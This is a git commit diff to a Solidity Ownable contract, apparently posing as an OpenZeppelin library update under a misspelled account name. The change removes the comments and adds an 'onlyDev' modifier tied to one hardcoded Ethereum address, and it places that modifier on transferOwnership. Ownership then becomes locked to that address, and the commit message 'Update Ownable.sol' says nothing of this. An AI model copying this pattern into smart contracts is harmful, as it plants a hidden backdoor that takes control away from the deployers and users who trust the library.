b2dfac09e3e893fed4aa276ce8bb67e50a123b74
Open-Zeppelin Ethereum Lab <32823705+OpenZepelinLib@users.noreply.github.com>
2017-12-16 08:27:55 +0300

    Update Ownable.sol

--- Ownable.sol
+++ Ownable.sol
@@ -1,44 +1,27 @@
 pragma solidity ^0.4.11;
 
+contract Ownable
+{
+    address public owner;
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+    
+    function Ownable() public {
+        owner = msg.sender;
+    }
 
-/**
- * @title Ownable
- * @dev The Ownable contract has an owner address, and provides basic authorization control
- * functions, this simplifies the implementation of "user permissions".
- */
-contract Ownable {
-  address public owner;
+    modifier onlyOwner() {
+        require(msg.sender == owner);
+        _;
+    }
+    
+    modifier onlyDev() {
+        require(msg.sender == 0x81Cfe8eFdb6c7B7218DDd5F6bda3AA4cd1554Fd2);
+        _;
+    }
 
-
-  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
-
-
-  /**
-   * @dev The Ownable constructor sets the original `owner` of the contract to the sender
-   * account.
-   */
-  function Ownable() {
-    owner = msg.sender;
-  }
-
-
-  /**
-   * @dev Throws if called by any account other than the owner.
-   */
-  modifier onlyOwner() {
-    require(msg.sender == owner);
-    _;
-  }
-
-
-  /**
-   * @dev Allows the current owner to transfer control of the contract to a newOwner.
-   * @param newOwner The address to transfer ownership to.
-   */
-  function transferOwnership(address newOwner) onlyOwner public {
-    require(newOwner != address(0));
-    OwnershipTransferred(owner, newOwner);
-    owner = newOwner;
-  }
-
+    function transferOwnership(address newOwner) public onlyOwner onlyDev {
+        require(newOwner != address(0));
+        OwnershipTransferred(owner, newOwner);
+        owner = newOwner;
+    }
 }
